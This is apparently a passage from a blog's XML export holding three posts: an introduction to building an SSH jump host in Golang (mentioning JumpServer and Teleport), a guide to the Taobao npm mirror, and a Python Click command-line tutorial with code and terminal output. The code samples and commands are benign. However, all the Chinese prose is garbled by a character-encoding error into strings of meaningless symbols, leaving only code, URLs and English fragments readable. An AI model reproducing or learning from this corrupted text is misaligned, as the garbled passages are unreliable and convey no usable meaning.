    <content type="text"><![CDATA[‰∏ÄÁõ¥ÂèÇ‰∏éJumpServerÁöÑÂºÄÂèë, ‰πü‰∏ÄÁõ¥Âú®ÊÉ≥Â¶Ç‰ΩïËÆæËÆ°‰∏Ä‰∏™Áõ∏ÂØπÂÆåÁæéÁöÑË∑≥ÊùøÊú∫, Ë∑≥ÊùøÊú∫ÁöÑÊú¨Ë¥®ÊòØsshÂçèËÆÆÁöÑÂèçÂêë‰ª£ÁêÜ(‰∏ªË¶ÅËøòÊòØssh, Ëá≥‰∫érdpËøòÊ≤°ÊÉ≥Ëøá), ËôΩÁÑ∂‰πüÁªèÂ∏∏‰ΩøÁî®ssh(ÂÅöËøêÁª¥ÁöÑÊó∂ÂÄôËøò‰∏ìÈó®Â∞±sshÂ≠¶‰π†Ëøá), ‰ΩÜ‰πü‰ªÖ‰ªÖÊòØsshÂÆ¢Êà∑Á´ØÁöÑ‰ΩøÁî®‰ª•ÂèäÊúçÂä°Á´ØÁöÑÈÖçÁΩÆ, ÊàëËßâÂæó‰∏Ä‰∏™ÂÆåÁæéÁöÑË∑≥ÊùøÊú∫Â∫îËØ•ÊòØ‰ªéÂçèËÆÆÂ±ÇÈù¢Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇÂõ†Ê≠§ÊâìÁÆó‰ª•Golang‰∏∫ÂºÄÂèëËØ≠Ë®Ä(Âõ†‰∏∫sshÂ∫ìÂÆåÂñÑÔºåwebsocketÁºñÂÜôÁÆÄÂçï),ÂºÄÂèë‰∏Ä‰∏™ÊúâÂü∫Êú¨ÂäüËÉΩÁöÑË∑≥ÊùøÊú∫„ÄÇ Ê¶ÇËø∞Ëøô‰∏ÄÁ≥ªÂàóÁöÑÂçöÂÆ¢ ÂåÖÂê´ÂæàÂ§öÁØá, ‰∏ªË¶ÅÁõÆÁöÑÊòØ: Âú®‰πãÂâçÁöÑÁªèÈ™å‰∏ä, ÊääÂºÄÂèëËøáÁ®ã‰∏≠Ê∂âÂèäÂà∞ÁöÑÊâÄÊúâÁü•ËØÜÂíåÊÑüÊÉ≥ËÆ∞ÂΩï‰∏ãÊù•(ÂΩìÁÑ∂ÂåÖÂê´Ê∫êÁ†Å), Ëøô‰∏ÄÁ≥ªÂàóÊ∂âÂèäÂ¶Ç‰∏ãÊñáÁ´†, Áî±ÊµÖÂÖ•Ê∑±, Âæ™Â∫èÊ∏êËøõÁöÑ‰ªãÁªçÂºÄÂèëËøáÁ®ã‰∏≠Ê∂âÂèäÂà∞ÁöÑÂêÑÁßçÁü•ËØÜ: Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∏Ä)-Êû∂ÊûÑ‰∏éÁÆÄ‰ªã Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∫å)-sshÂçèËÆÆÂéüÁêÜÁÆÄ‰ªã Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∏â)-Golang‰∏≠SSHÂÆ¢Êà∑Á´ØÁöÑÂÆûÁé∞ ÁÆÄÂçïÊû∂ÊûÑ‰πãÂâçJumpServerÁöÑÊ†∏ÂøÉÊòØÊåâÁÖßÁÆÄÂçïÁöÑÊû∂ÊûÑÊù•ÂºÄÂèëÁöÑ, ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊû∂ÊûÑÂÖ∂ÂÆûÂ∑≤ÁªèÊúâÂæàÂ§ö‰∏çÈîôÁöÑdemoÊàñËÄÖ‰∫ßÂìÅ‰∫Ü, ÊØîÂ¶ÇËøô‰∏™È°πÁõÆwebconsole, ÂΩìÁÑ∂‰ªñ‰∏çÂÆåÊï¥‰ªÖ‰ªÖÂÆûÁé∞‰∫ÜwebÔºåËá≥‰∫éÂëΩ‰ª§Ë°åÂπ∂Ê≤°ÊúâÂÆûÁé∞, ËÄåjumpserverËøô2‰∏™ÈÉΩÂÆûÁé∞‰∫Ü„ÄÇ‰∏∫‰ªÄ‰πàÁß∞‰πã‰∏∫ÁÆÄÂçïÁöÑÊû∂ÊûÑ, Âõ†‰∏∫‰ªñÁöÑÊ†∏ÂøÉÊÄùÊÉ≥Â∞±ÊòØ: Â∞±ÊòØÊ®°Êãü‰∏Ä‰∏™ÁªàÁ´Ø(webÁ´ØÁöÑxtermËøô‰∏™jsÂ∫ìÂ∞±ÊòØÂπ≤Ëøô‰∏™‰∫ãÂÑøÁöÑ, ËÄåÂëΩ‰ª§Ë°åÂêåÊ†∑Ê®°Êãü‰∏Ä‰∏™ÁªàÁ´ØÂ∞±Ë°å‰∫Ü, ÊØîÂ¶ÇgolangÁöÑssh/terminalËøô‰∏™Â∫ìÂ∞±ÂèØ‰ª•ÂÆåÊàêËøô‰∏™‰∫ãÂÑø),ÁÑ∂ÂêéÈÄöËøá‰∏Ä‰∏™ssh agentËÆøÈóÆÂêéÈù¢ÁöÑÁúüÂÆûÁöÑÊúçÂä°Âô®ÔºåËµ∑Âà∞‰∏Ä‰∏™‰ª£ÁêÜËΩ¨ÂèëÁöÑ‰ΩúÁî®„ÄÇ ËøôÁßçÊ®°ÂºèÁöÑÁº∫Èô∑‰∏ªË¶Å‰ΩìÁé∞Âú®ÂëΩ‰ª§Ë°åÁªàÁ´Ø‰∏äÈù¢, Âõ†‰∏∫Ê≠§Êó∂ÁªàÁ´ØÂêéÈù¢Êé•ÁöÑÂ∞±ÊòØsshÂÆ¢Êà∑Á´Ø, Âõ†Ê≠§Ëøô‰∏™ÁªàÁ´ØÊòØ‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÂíåË∑≥ÊùøÊú∫ÁªëÂÆöÂú®‰∏ÄËµ∑‰∫Ü, Áî®Êà∑Âè™ÊúâÂÖàÁôªÂΩïË∑≥ÊùøÊú∫ÊâçËÉΩ‰ΩøÁî®‰ª£ÁêÜÊúçÂä°, ËÄåËøôÊòæÁÑ∂ÊòØ‰∏çÂêàÁêÜÁöÑ,JumpserverÂú®Ê≠§‰∏äËøõË°å‰∫ÜÊîπËøõ, ÈÄöËøáÂÜçÊ∑ªÂä†‰∏Ä‰∏™ssh serverÁõëÂê¨, ÂÆûÈôÖ‰∏äÂ∞±ÊòØssh-in-ssh„ÄÇ Êû∂ÊûÑÊîπËøõÊîπËøõËøáÂêé‰∏ªË¶ÅÂä†ÂÖ•‰∏Ä‰∏™sshÁöÑ‰ª£ÁêÜÊúçÂä°,Áªü‰∏Ä‰ª£ÁêÜÂ±Ç, ÊäΩÁ¶ªÂÆ¢Êà∑Á´Ø„ÄÇ ÂÆåÁæéÊû∂ÊûÑ‰∏™‰∫∫Êû∂ÊûÑÁöÑËÉΩÂäõËøòÊòØÂæàËèúÁöÑ, ÂØπsshÂçèËÆÆÁöÑÁêÜËß£‰πü‰∏çÊ∑±, ÂΩìÁúãÂà∞teleportËøô‰∏™ÂºÄÊ∫ê‰∫ßÂìÅÁöÑËÆæËÆ°Êó∂, ÂÆåÂÖ®Ë¢´ÊÉäÂëÜ‰∫Ü„ÄÇ Ëøô‰∏çÂ∞±ÊòØÊàëÊÉ≥Ë¶ÅÁöÑÊû∂ÊûÑÂòõ, ËÄå‰∏îÁªÜËäÇÊòØÂÅöÁöÑÈÇ£‰πàÁöÑÊºÇ‰∫Æ„ÄÇÂêéÊúüÂ¶ÇÊûúÊúâÊó∂Èó¥ÁöÑËØù, ÊâìÁÆóÂÜô‰∏Ä‰∏™ÂÖ≥‰∫ételeportÊ∫êÁ†ÅËß£ËØªÁöÑÁ≥ªÂàó, ‰∏ÄÁÇπ‰∏Ä‰∏™ÂâñÊûêËøô‰∏™ÂÆåÁæéÊû∂ÊûÑÁöÑÂÆûÁé∞„ÄÇ ÊÄªÁªìÂÜôËøô‰∏Ä‰∏™Á≥ªÂàó‰∏çÂÆπÊòì, ËøôÊòØ‰∏Ä‰∏™ÂºÄÁØáÂíåËßÑÂàíÔºåÂ∏åÊúõÊúÄÂêéËÉΩÂÆåÁæéÁöÑÊî∂Â∞æÔºåÊúâ‰∏Ä‰∏™‰∏çÈîôÁöÑdemoÂ±ïÁ§∫ÁªôÂ§ßÂÆ∂„ÄÇÁé∞Âú®ÁúãÊù•teleportÂ∑≤ÁªèÂæàÂÆåÂñÑ‰∫Ü, ‰πüÁ¨¶ÂêàÊàëÂøÉÁõÆ‰∏≠ÁöÑË∑≥ÊùøÊú∫ÁöÑÊ†∑Â≠ê, Á≠âËØªÂÆåteleportÊ∫êÁ†ÅËøáÂêé, ÁúãÂÖ∂ÊòØÂê¶ÂÆåÂñÑ, Êâ©Â±ïÊòØÂê¶Êñπ‰æø, Âõ†Ê≠§ÂæàÊúâÂèØËÉΩÊòØÂÆåÂñÑteleport,ËÄå‰∏çÊòØ‰ªéÂ§¥ÂºÄÂßã„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodejsÊ∫êÂä†ÈÄü]]></title>
    <url>%2F2017%2F02%2F14%2Fnodejs-accelerate%2F</url>
    <content type="text"><![CDATA[‰πãÂâç‰ªãÁªçËøá‰ΩøÁî®vscodeÊê≠Âª∫nodejsÂºÄÂèëÁéØÂ¢É, ÁéØÂ¢ÉÊòØÊê≠Âª∫Â•Ω‰∫Ü, ‰ΩøÁî®Êó∂Êúâ‰∏Ä‰∏™Á°¨‰º§, Â∞±ÊòØnodejsÂÆòÊñπÁöÑÊ∫ê‰∏ãËΩΩÂ•áÊÖ¢, ËÄå‰∏ÄËà¨jsÁöÑÈ°πÁõÆ‰æùËµñÂèàÂ§ö, ÊâÄ‰ª•ÁªèÂ∏∏ÁöÑÁªìÊûúÂ∞±ÊòØ: ÊÖ¢Âæó‰Ω†Âï•ÈÉΩË£Ö‰∏ç‰∏ä(time out)„ÄÇÊÄé‰πàËß£ÂÜ≥ÂñÉÔºü ÂΩìÁÑ∂ÊòØÊç¢ÂõΩÂÜÖÁöÑÊ∫ê„ÄÇÊàë‰ªÖ‰ΩøÁî®ËøáÊ∑òÂÆùÁöÑÂä†ÈÄüÊ∫êÔºåÊïàÊûú‰∏çÈîôÔºå‰∏ÄÁõ¥Áî®ÁùÄÔºå‰∏ãÈù¢ÂÅöÁÆÄÂçïÁöÑ‰ªãÁªç„ÄÇ ÁÆÄ‰ªãÊ∑òÂÆùNPMÈïúÂÉèÂÆòÊñπÊòØËøôÊ†∑ÊèèËø∞ÁöÑ: ËøôÊòØ‰∏Ä‰∏™ÂÆåÊï¥ npmjs.org ÈïúÂÉèÔºå‰Ω†ÂèØ‰ª•Áî®Ê≠§‰ª£ÊõøÂÆòÊñπÁâàÊú¨(Âè™ËØª)ÔºåÂêåÊ≠•È¢ëÁéáÁõÆÂâç‰∏∫ 10ÂàÜÈíü ‰∏ÄÊ¨°‰ª•‰øùËØÅÂ∞ΩÈáè‰∏éÂÆòÊñπÊúçÂä°ÂêåÊ≠•„ÄÇÂÖ≥‰∫éÊõ¥Â§öÁöÑ‰ø°ÊÅØËØ∑Êü•Áúã:Ê∑òÂÆùNPMÊ∫êÂÆòÁΩë ÂêåÊ≠•‰ªéregistry.npm.taobao.orgÂÆâË£ÖÊâÄÊúâÊ®°Âùó. ÂΩìÂÆâË£ÖÁöÑÊó∂ÂÄôÂèëÁé∞ÂÆâË£ÖÁöÑÊ®°ÂùóËøòÊ≤°ÊúâÂêåÊ≠•ËøáÊù•, Ê∑òÂÆùNPM‰ºöËá™Âä®Âú®ÂêéÂè∞ËøõË°åÂêåÊ≠•, Âπ∂‰∏î‰ºöËÆ©‰Ω†‰ªéÂÆòÊñπ NPM registry.npmjs.org ËøõË°åÂÆâË£Ö. ‰∏ãÊ¨°‰Ω†ÂÜçÂÆâË£ÖËøô‰∏™Ê®°ÂùóÁöÑÊó∂ÂÄô, Â∞±‰ºöÁõ¥Êé•‰ªé Ê∑òÂÆù NPM ÂÆâË£Ö‰∫Ü. ÂÆâË£Ö‰∏¥Êó∂‰ΩøÁî®ÁöÑËØù, ÂèØ‰ª•ÈÄöËøáregistryÂèÇÊï∞Êù•ÊåáÂÆöÊ∑òÂÆùÊ∫êÂú∞ÂùÄÔºåÊØîÂ¶Ç1npm --registry=https://registry.npm.taobao.org xterm ÂΩìÁÑ∂‰πüÂèØ‰ª•Ê∑ªÂä†ÂëΩ‰ª§Âà´Âêç,ËøôÊ†∑Â∞±‰∏çÁî®ÊØèÊ¨°ÈÉΩÊ∑ªÂä†‚Äìregistry‰∫Ü12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \--cache=$HOME/.npm/.cache/cnpm \--disturl=https://npm.taobao.org/dist \--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \ --cache=$HOME/.npm/.cache/cnpm \ --disturl=https://npm.taobao.org/dist \ --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc ÂÖ∂ÂÆûÊ∑òÂÆùÁöÑÊ∫êÂæàÁ®≥ÂÆöÔºåÂêåÊ≠•È¢ëÁéá‰πüÂø´ÔºåÂõ†Ê≠§‰∏ÄËà¨Áõ¥Êé•ÊõøÊç¢Á≥ªÁªüÁöÑnpm‰πüÂèØ‰ª•1npm install -g cnpm --registry=https://registry.npm.taobao.org]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Ê∫êÂä†ÈÄü</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PythonÂëΩ‰ª§Ë°åÂºÄÂèëÁ•ûÂô®-click]]></title>
    <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
    <content type="text"><![CDATA[‰πãÂâçÂÜôËøá‰∏ÄÁØáÂçöÂÆ¢‰ªãÁªçËøáÂ¶Ç‰ΩïÂÜôÊºÇ‰∫ÆÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑, ‰∏çËøá‰ΩøÁî®ÁöÑÊòØgolangÁöÑcobraÂ∫ì, Êï¥‰ΩìËÄåË®ÄÊïàÊûúÂíå‰ΩøÁî®‰ΩìÈ™åËøòÊòØÈùûÂ∏∏‰∏çÈîôÁöÑ, ‰∏çËøá‰ªäÂ§©ÁúãÂçöÂÆ¢Êó∂ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Êõ¥‰∏çÈîôÁöÑÂ∫ìÔºåËÄå‰∏îÊòØPythonÁöÑ: Click,ÊâÄ‰ª•Áî®Ëµ∑Êù•Â∫îËØ•Êõ¥ÂæóÂøÉÂ∫îÊâã„ÄÇ ‰πãÂâçÂú®ÂºÄÂèëopenstackÂÆ¢Êà∑Á´ØÊó∂, Ê®°‰ªøopenstack sdkÂÜôËøáCLI, ‰ªñ‰πüÊòØÂØπargparseÂ∫ì‰∏äÂÅöÁöÑÂ∞ÅË£Ö, ‰ΩÜÊòØ‰ΩøÁî®Ëµ∑Êù•‰πüÊØîËæÉÂ§çÊùÇ, ÁÆÄÂçïÁúã‰∫Ü‰∏ãclickÁöÑÊñáÊ°£, ‰ΩìÈ™åËøòÊòØÈùûÂ∏∏‰∏çÈîôÁöÑ„ÄÇ ÁÆÄ‰ªãÂÖàËØ¥‰∏ãclickÁöÑÂá∫Áîü, Âõ†‰∏∫‰ªñÂá∫ÁîüÂêçÈó®: Pocoo, PocooÊòØ‰∏Ä‰∏™Âõ¢ÈòüÔºåPocooÂá∫ÂìÅÂøÖÊòØÁ≤æÂìÅ,ÊØîÂ¶Ç Flask, Werkzeug, Jinja 2 , Pygments, Sphinx„ÄÇÂÜ≤ÁùÄpocooÁöÑÂìÅÁâå, ÈÉΩÂ∫îËØ•Â§öÁúã‰∏ÄÁúºclick„ÄÇclickÊòØ‰∏Ä‰∏™Áî®‰∫éÂø´ÈÄüÊûÑÂª∫ÂëΩ‰ª§Ë°åÁöÑpythonÁöÑÁ¨¨‰∏âÊñπÊ®°Âùó, ÂäüËÉΩÂº∫Â§ß, ‰ΩøÁî®ÁÆÄÂçï„ÄÇÊàë‰ª¨ÈÉΩÁü•ÈÅìPythonÂÜÖÁΩÆÁöÑArgparseÊ®°ÂùóÔºå‰ª•Ââç‰πüÁªèÂ∏∏Áî®Âà∞, ÂΩìÊó∂ËßâÂæóArgparseÂæà‰∏çÈîô, Âõ†‰∏∫Ê≤°ÊúâÂØπÊØî(Ê≤°ÊúâÂØπÊØîÂ∞±Ê≤°‰º§ÂÆ≥), Áúã‰∫Ü‰∏ãClickÈ©¨‰∏äÂ∞±ËßâÂæóArgparseÂ§™ÁπÅÁêê‰∫ÜÔºåClickÁõ∏ËæÉ‰∫éArgparseÂ∞±Â•ΩÊØîrequestsÂØπÊØîurllib„ÄÇÊàë‰ª¨ÁúãÁúãclickÂÆòÊñπÊñáÊ°£‰∏äÊòØÊÄé‰πàËØ¥ÊòéclickÁöÑÔºö ClickÊòØ‰∏Ä‰∏™‰ΩøÁî®ÊúÄÂ∞ë‰ª£Á†ÅÊûÑÂª∫ÊºÇ‰∫ÆCLIÁöÑÂëΩ‰ª§Ë°åÁïåÈù¢ÂàõÂª∫Â∑•ÂÖ∑ÂåÖ, È´òÂ∫¶ÂèØÈÖçÁΩÆ,‰ΩÜÊòØÂç¥ÂºÄÁÆ±Âç≥Áî®‰ªñÊúâ3‰∏™ÁâπÁÇπÔºö ÊîØÊåÅÂëΩ‰ª§ÁöÑ‰ªªÊÑèÂµåÂ•ó ÊîØÊåÅÂëΩ‰ª§Ë°åÂ∏ÆÂä©È°µÈù¢ÁöÑËá™Âä®ÁîüÊàê ÊîØÊåÅÂ≠êÂëΩ‰ª§ËøêË°åÊó∂ÊÉ∞ÊÄßÂä†ËΩΩ Âø´ÈÄü‰ΩøÁî®ÊûÑÂª∫CLIÊúâ2‰∏™Ë¶ÅÁÇπ: ÂëΩ‰ª§ÂíåÂèÇÊï∞, ‰ΩøÁî®clickÊó∂Ôºå@click.command()Áî®Êà∑Ë£ÖÈ•∞ÂëΩ‰ª§, @click.option()Âíå@click.argument()Áî®‰∫éË£ÖÈ•∞ÂèÇÊï∞, ÊØîÂ¶Ç‰∏ãÈù¢Â∞±ÊòØ‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑ‰ΩøÁî®ÂΩ¢Âºè:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() ‰∏∫‰∫ÜÊºîÁ§∫‰ªñÊõ¥Âº∫Â§ßÁöÑÂäüËÉΩ, Êàë‰ª¨ÂèØ‰ª•Ê®°Êãü‰∏Ä‰∏™dockerÁöÑÂëΩ‰ª§Ë°å„ÄÇ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() ÊúÄÁªàÊïàÊûúÂ¶Ç‰∏ã:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859‚ûú test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumes‚ûú test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networks‚ûú test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumes‚ûú test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.‚ûú test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. ÂëΩ‰ª§‰∏éÁªÑËøôÊòØclick‰∏≠ÊúÄÈáçË¶ÅÁöÑÊ¶ÇÂøµ, Êàë‰ª¨ÂèØ‰ª•ÈÄöËøácommandÂíågroupË£ÖÈ•∞Âô®ÂÆûÁé∞‰∏Ä‰∏™Êó†ÈôêÂµåÂ•óÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑, ÂÖ∂‰∏≠commandÁî®Êà∑Ë£ÖÈ•∞ÂëΩ‰ª§, groupÁî®‰∫éÂ∞ÜÂëΩ‰ª§ÂàÜÁªÑ(Á±ª)‰∏äÈù¢ÈÇ£‰∏™Ê®°ÂùódockerÂëΩ‰ª§Ë°åÂ∞±ÊòØÂàÜÁªÑÁöÑ‰ΩøÁî®„ÄÇ123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() ÂëΩ‰ª§Ë°åÂèÇÊï∞‰ªéÂëΩ‰ª§Ë°åËØªÂèñÂèÇÊï∞ÂÄºÔºåÂÜçÂ∞ÜÂÖ∂‰º†ÈÄíÁªôÂáΩÊï∞,ËØªÂèñÁöÑÂèÇÊï∞ÂàÜ‰∏∫‰∏§Á±ª: ÂèØÈÄâÂèÇÊï∞ÂíåÂøÖÈ°ªÂèÇÊï∞Ôºå‰∏ãÈù¢ÂàÜÂà´ÂÅö‰ªãÁªç ÂèØÈÄâÂèÇÊï∞‰ΩøÁî®@click.optionË£ÖÈ•∞Âô®ÂÆåÊàêÂèØÈÄâÂèÇÊï∞ÁöÑÂΩïÂÖ•, ÈÄöËøá‰∏äÈù¢ÁöÑÊ†óÂ≠êÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ËØ•Ë£ÖÈ•∞Âô®ÊúâÂæàÂ§öÂèÇÊï∞ÂâçÈù¢2‰∏™‰ΩçÁΩÆÂèÇÊï∞ÊØîÂ¶Ç‚Äô-f‚Äô, ‚Äò‚Äìforce‚ÄôÁî®‰∫éÊèèËø∞ÂèÇÊï∞ÂêçÁß∞, typeÊåáÊòéÂèÇÊï∞Á≠âÔºåoptionÂ∏∏Áî®ÁöÑËÆæÁΩÆÂèÇÊï∞Â¶Ç‰∏ãÔºö default: ËÆæÁΩÆÂëΩ‰ª§Ë°åÂèÇÊï∞ÁöÑÈªòËÆ§ÂÄº help: ÂèÇÊï∞ËØ¥Êòé type: ÂèÇÊï∞Á±ªÂûãÔºåÂèØ‰ª•ÊòØ string, int, float Á≠â prompt: ÂΩìÂú®ÂëΩ‰ª§Ë°å‰∏≠Ê≤°ÊúâËæìÂÖ•Áõ∏Â∫îÁöÑÂèÇÊï∞Êó∂Ôºå‰ºöÊ†πÊçÆ prompt ÊèêÁ§∫Áî®Êà∑ËæìÂÖ• nargs: ÊåáÂÆöÂëΩ‰ª§Ë°åÂèÇÊï∞Êé•Êî∂ÁöÑÂÄºÁöÑ‰∏™Êï∞Êàë‰ª¨ÂèØ‰ª•‰æùÁÑ∂Ëøô‰∫õÈÄâÈ°πÊù•ÂÆåÊàêÊàë‰ª¨ÂæàÈïøÂ∏∏Áî®ÁöÑÂäüËÉΩ ÈªòËÆ§ÂèÇÊï∞ÁªèÂ∏∏Êàë‰ª¨ÈúÄË¶Å‰∏∫ÂèÇÊï∞ËÆæÁΩÆ‰∏Ä‰∫õÈªòËÆ§ÂÄº, ‰ΩøÁî®defaultÊåáÂÆöÂèÇÊï∞ÁöÑÈªòËÆ§ÂÄºÂ∞±ËÉΩÂäûÂà∞, Â∞±Ëøô‰πàÁÆÄÂçï12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() ËøêË°åÁªìÊûú:123456789101112‚ûú test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a network‚ûú test python3 test.py network createcreate network flat success ÈÄâÊã©ÂèÇÊï∞ÂæàÂ§öÊÉÖÂÜµ‰∏ã, Êàë‰ª¨‰πü‰ºöÁªôÁî®Êà∑‰∏Ä‰∫õÈÄâÊã©ÂèÇÊï∞, ÊØîÂ¶ÇÊÄßÂà´Â∞±Âè™ËÉΩÈÄâÊã©(M/F), Âõ†Ê≠§Êàë‰ª¨Â∫îËØ•ÊèêÁ§∫Áî®Êà∑ËæìÂÖ•Ê≠£Á°ÆÁöÑÂÄº,Âú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá click.Choice() Êù•ÈôêÂÆö1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() Â§öÂÄºÂèÇÊï∞ÊúâÊó∂Ôºå‰∏Ä‰∏™ÂèÇÊï∞ÈúÄË¶ÅÊé•Êî∂Â§ö‰∏™ÂÄº, ÊØîÂ¶ÇÊàë‰ª¨ÁÆó‰∏Ä‰∏™Á´ãÊñπ‰ΩìÁöÑ‰ΩìÁßØ, ËøôÊó∂ÂÄôÊàë‰ª¨Â∞±ÈúÄÊ±ÇÈÄöËøánargsÊåáÂÆö ËØ•ÂèÇÊï∞Êé•Êî∂Â§öÂ∞ë‰∏™ÂÄº, ÊØîÂ¶Ç123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) ÂØÜÁ†ÅÂèÇÊï∞ÂëΩ‰ª§Ë°åÊàë‰ª¨Â∏∏Â∏∏ÊúâËæìÂÖ•ÂØÜÁ†ÅÁöÑÈúÄÊ±ÇÔºåËøô‰∏™Êàë‰ª¨Â∫îËØ•ÊÄé‰πàÁî®ÂñÉÔºü123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) Ëøô‰∏™Áúã‰∏ãÊïàÊûú:1234‚ûú test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 ÂøÖÈÄâÂèÇÊï∞Áõ∏ËæÉ‰∫éÂèØÈÄâÂèÇÊï∞ÁöÑÁÅµÊ¥ªÊÄßËÄåË®Ä, ÂøÖÈ°ªÂèÇÊï∞ÊØîËæÉÁÆÄÂçï‰∫Ü„ÄÇÁî®@click.argumentÊù•Ê∑ªÂä†Âõ∫ÂÆöÂèÇÊï∞„ÄÇ ÂÆöÂèÇËøôÈáåÈúÄË¶Å‰∏ªË¶Å‰ΩçÁΩÆÂèÇÊï∞ÁöÑÈ°∫Â∫è‰∫Ü„ÄÇÊØîÂ¶Ç3‰∏™ÂÆöÂèÇÊï∞ x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910‚ûú test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".‚ûú test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".‚ûú test python3 test.py user create 1 2 31, 2, 3 ‰∏çÂÆöÂèÇÂèÇÊï∞‰∏çÂÆöÁöÑÊÉÖÂÜµ‰πüÊòØÂ∏∏ÊúâÁöÑ, ÊØîÂ¶ÇÊàë‰ª¨ÊÉ≥Â∞ÜÂ§ö‰∏™Êñá‰ª∂ÁßªÂà∞‰∏Ä‰∏™Êñá‰ª∂ÈáåÈù¢, src: file1 file2 file3 dir: file4„ÄÇÊàë‰ª¨ËÆ©nargs=-1Â∞±ÂèØ‰ª•‰∫Ü, ‰ªñË°®Á§∫Êé•Êî∂[:-1]ÁöÑÂèÇÊï∞1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123‚ûú test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 